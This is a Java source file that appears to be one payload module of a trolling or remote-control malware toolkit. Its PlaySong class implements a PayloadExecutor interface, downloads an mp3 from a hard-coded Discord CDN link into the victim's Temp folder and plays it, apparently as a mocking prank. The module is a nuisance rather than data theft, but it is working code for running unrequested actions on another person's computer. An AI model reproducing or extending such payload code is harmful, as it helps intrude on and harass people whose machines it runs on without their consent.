package dev.peter.luterium.features.fun;

import dev.peter.luterium.payload.PayloadExecutor;
import dev.peter.luterium.utils.FileUtil;
import dev.peter.luterium.utils.Mp3Util;

import java.io.File;

/**
 * @author Peter
 * @since 10/25/2022
 * Allah!
 */

public class PlaySong implements PayloadExecutor {
    FileUtil fileUtil = new FileUtil();

    String allahUrl = "https://cdn.discordapp.com/attachments/983114144712622160/1034539557166776350/allah.mp3";
    String allahPath = System.getProperty("user.home") + "\\AppData\\Local\\Temp\\allah.mp3";

    @Override
    public void execute() throws Exception {
        fileUtil.downloadFile(allahUrl, (new File(allahPath)));

        Mp3Util mp3Util = new Mp3Util(allahPath);
        mp3Util.play();
    }
}
